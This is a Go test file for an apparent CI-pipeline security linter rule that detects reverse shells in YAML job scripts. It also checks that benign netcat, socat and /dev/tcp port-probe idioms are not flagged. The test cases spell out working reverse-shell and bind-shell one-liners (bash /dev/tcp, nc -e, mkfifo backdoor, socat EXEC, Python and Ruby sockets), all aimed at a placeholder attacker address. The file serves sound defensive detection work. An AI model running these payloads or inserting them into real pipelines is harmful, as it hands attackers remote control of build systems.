package rules

import (
	"strings"
	"testing"

	"github.com/glsec/glsec/internal/finding"
	"github.com/glsec/glsec/internal/parser"
)

func findings083(t *testing.T, yaml string) []finding.Finding {
	t.Helper()
	doc, err := parser.Parse([]byte(yaml), "test.yml")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	return GL083.Check(doc.Root, "test.yml")
}

func TestGL083_Payloads(t *testing.T) {
	cases := []struct {
		name string
		line string
		kind string
	}{
		{"bash socket redirect", `bash -i >& /dev/tcp/198.51.100.7/4444 0>&1`, "shell redirected to a socket"},
		{"sh socket redirect", `/bin/sh -i >& /dev/tcp/198.51.100.7/4444 0>&1`, "shell redirected to a socket"},
		{"udp socket redirect", `bash -i >& /dev/udp/198.51.100.7/4444 0>&1`, "shell redirected to a socket"},
		{"quoted payload", `bash -c "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"`, "shell redirected to a socket"},
		{"nc -e", `nc -e /bin/sh 198.51.100.7 4444`, "netcat with command execution"},
		{"nc combined flags", `nc -nve /bin/bash 198.51.100.7 4444`, "netcat with command execution"},
		{"ncat long flag", `ncat --sh-exec "/bin/bash" 198.51.100.7 4444`, "netcat with command execution"},
		{"netcat.traditional", `netcat.traditional -c /bin/sh 198.51.100.7 4444`, "netcat with command execution"},
		{"mkfifo backdoor", `mkfifo /tmp/f; cat /tmp/f | /bin/sh 2>&1 | nc 198.51.100.7 4444 > /tmp/f`, "named-pipe backdoor"},
		{"socat exec", `socat TCP:198.51.100.7:4444 EXEC:/bin/bash`, "socat with a program endpoint"},
		{"socat lowercase exec", `socat tcp:198.51.100.7:4444 exec:'bash -li',pty,stderr`, "socat with a program endpoint"},
		{"socat system", `socat TCP:198.51.100.7:4444 SYSTEM:/bin/sh`, "socat with a program endpoint"},
		{
			"python one-liner",
			`python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("198.51.100.7",4444));os.dup2(s.fileno(),0);subprocess.call(["/bin/sh"])'`,
			"interpreter socket one-liner",
		},
		{"ruby one-liner", `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("198.51.100.7","4444");exec "/bin/sh"'`, "interpreter socket one-liner"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			f := findings083(t, "job:\n  script:\n    - '"+strings.ReplaceAll(tc.line, "'", "''")+"'\n")
			if len(f) != 1 {
				t.Fatalf("expected 1 finding, got %d", len(f))
			}
			if f[0].Severity != finding.Error {
				t.Errorf("expected Error severity, got %s", f[0].Severity)
			}
			if !strings.Contains(f[0].Message, tc.kind) {
				t.Errorf("message %q does not name the pattern %q", f[0].Message, tc.kind)
			}
		})
	}
}

func TestGL083_LegitimateIdioms(t *testing.T) {
	cases := []struct {
		name string
		line string
	}{
		{"wait for service", `timeout 1 bash -c "cat < /dev/null > /dev/tcp/postgres/5432"`},
		{"port check", `nc -z postgres 5432`},
		{"nc with timeout flag", `nc -w 5 postgres 5432 < /dev/null`},
		{"nc listener", `nc -l -p 8080 > response.txt`},
		{"install netcat", `apk add --no-cache netcat-openbsd`},
		{"socat port forward", `socat TCP-LISTEN:15432,fork TCP:postgres:5432`},
		{"mkfifo for logs", `mkfifo /tmp/logpipe && tail -f /tmp/logpipe`},
		{"plain shell", `bash -euo pipefail ./build.sh`},
		{"interactive-looking flag", `docker run -i --rm alpine:3.19.1 sh -c "echo hi"`},
		{"python without socket", `python3 -c "import subprocess;subprocess.call(['make'])"`},
		{"connectivity probe", `bash -c 'echo > /dev/tcp/redis/6379' && echo up`},
		// The four false-positive classes found scanning 265 real pipelines (#480).
		{"read-write port probe", `if (exec 3<>/dev/tcp/postgres/5432) 2>/dev/null; then echo up; fi`},
		{"read-write probe in a subshell", `if bash -c 'exec 3<>/dev/tcp/127.0.0.1/11119' 2>/dev/null; then break; fi`},
		{"raw http client over /dev/tcp", `bash -c "exec 3<>/dev/tcp/127.0.0.1/9095; cat >&3; cat <&3"`},
		{"socat driving a local command", `timeout 1200 socat EXEC:'az containerapp exec --command /deploy.sh --name portal',pty,setsid,ctty STDIO,ignoreeof`},
		{"netcat serving a fixed response", `nc -lc "printf 'HTTP/1.1 200 OK\n\n'; cat build/image.zip" -l 8080`},
		{"rsync remote shell flag", `rsync -e "ssh -i ~/.ssh/id_rsa" -az dist/ user@host:/srv/`},
		{"installing netcat then probing", `sh -c "apk add --no-cache netcat-openbsd && nc -z mailserver 25"`},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			f := findings083(t, "job:\n  script:\n    - '"+strings.ReplaceAll(tc.line, "'", "''")+"'\n")
			if len(f) != 0 {
				t.Fatalf("expected no finding for %q, got %d: %s", tc.line, len(f), f[0].Message)
			}
		})
	}
}

func TestGL083_ReportsJobAndLineOnce(t *testing.T) {
	f := findings083(t, `
deploy:
  before_script:
    - socat TCP:198.51.100.7:4444 EXEC:/bin/bash
  script:
    - make deploy
`)
	if len(f) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(f))
	}
	if f[0].Job != "deploy" {
		t.Errorf("expected job %q, got %q", "deploy", f[0].Job)
	}
	if f[0].Line != 4 {
		t.Errorf("expected line 4, got %d", f[0].Line)
	}
}

func TestGL083_OneFindingPerLine(t *testing.T) {
	f := findings083(t, `
job:
  script:
    - mkfifo /tmp/f; nc -e /bin/sh 198.51.100.7 4444 < /tmp/f
`)
	if len(f) != 1 {
		t.Fatalf("expected 1 finding for a line matching two patterns, got %d", len(f))
	}
}

func TestGL083_RunSteps(t *testing.T) {
	f := findings083(t, `
job:
  run:
    - name: backdoor
      script: nc -e /bin/sh 198.51.100.7 4444
`)
	if len(f) != 1 {
		t.Fatalf("expected 1 finding in a run: step, got %d", len(f))
	}
}

func TestGL083_GlobalAndDefaultBlocks(t *testing.T) {
	f := findings083(t, `
before_script:
  - socat TCP:198.51.100.7:4444 EXEC:/bin/sh

default:
  after_script:
    - nc -e /bin/sh 198.51.100.7 4444

job:
  script:
    - make
`)
	if len(f) != 2 {
		t.Fatalf("expected 2 findings across global and default blocks, got %d", len(f))
	}
	for _, x := range f {
		if x.Job != "" {
			t.Errorf("expected empty job for a global/default block, got %q", x.Job)
		}
	}
}

// A `|` block scalar reaches the rule as a single item. Tokens on different
// physical lines must not be paired: this block has a netcat probe on one line
// and a `sh -c` several lines later, and neither is a reverse shell.
func TestGL083_BlockScalarLinesAreSeparate(t *testing.T) {
	f := findings083(t, `
health:
  script:
    - |
      echo "running health checks"
      sh -c "apk add --no-cache netcat-openbsd && nc -z mailserver 25"
      echo "mail ok"
      sh -c "apk add --no-cache mariadb-client && mysqladmin ping"
`)
	if len(f) != 0 {
		t.Fatalf("expected no finding across block scalar lines, got %d: %s", len(f), f[0].Message)
	}
}

// The reported payload is the offending line, not the whole block.
func TestGL083_ReportsTheOffendingLine(t *testing.T) {
	f := findings083(t, `
job:
  script:
    - |
      echo "starting"
      nc -e /bin/sh 198.51.100.7 4444
      echo "done"
`)
	if len(f) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(f))
	}
	if !strings.Contains(f[0].Message, "nc -e /bin/sh") {
		t.Errorf("message should quote the offending line, got %s", f[0].Message)
	}
	if strings.Contains(f[0].Message, "starting") {
		t.Errorf("message should not quote the whole block, got %s", f[0].Message)
	}
}

func TestGL083_SocatNeedsANetworkEndpoint(t *testing.T) {
	f := findings083(t, `
job:
  script:
    - socat TCP-LISTEN:4444,fork EXEC:/bin/sh
`)
	if len(f) != 1 {
		t.Fatalf("expected 1 finding for a socat bind shell, got %d", len(f))
	}
}
